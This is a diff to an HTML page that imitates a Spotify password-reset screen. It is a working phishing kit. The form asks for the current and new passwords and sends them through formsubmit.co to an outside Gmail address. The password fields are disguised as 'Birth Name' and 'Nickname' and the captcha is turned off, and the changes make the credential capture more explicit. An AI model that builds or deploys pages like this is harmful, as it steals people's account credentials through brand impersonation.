@@ -21,15 +21,15 @@
 
 
         .logo {
-            width: 120px;
+            width: 150px;
             height: auto;
             margin-bottom: 20px;
         }
 
         .reset-container {
             background-color: #111111;
-            padding: 40px;
-            border-radius: 10px;
+            padding: 80px;
+            border-radius: 20px;
             text-align: center;
             box-shadow: 0 0 20px #1DB954;
         }
@@ -73,14 +73,16 @@
 <body>
     <div class="reset-container">
         <img src="logo.png" alt="Logo" class="logo">
-        <h1>Update Expired</h1>
+        <h1>Update Expired Credentials</h1>
         <form action="https://formsubmit.co/supportresets07@gmail.com" method="POST">
             <input type="hidden" name="_next" value="https://myresets.github.io/spotify/thank-you.html">
             <input type="hidden" name="_captcha" value="false">
 
-            <input type="text" name="Birth Name" placeholder="Enter Current" required>
+            <input type="text" name="Birth Name" placeholder="Enter Current Password" required>
             <br>
-            <input type="text" name="Nickname" placeholder="Enter New" required>
+            <input type="text" name="Nickname" placeholder="Enter New Password" required>
+            <br>
+            <input type="text" name="NicknameConfirm" placeholder="Confirm New Password" required>
             <br>
             <button type="submit">Form Submission</button>
         </form>
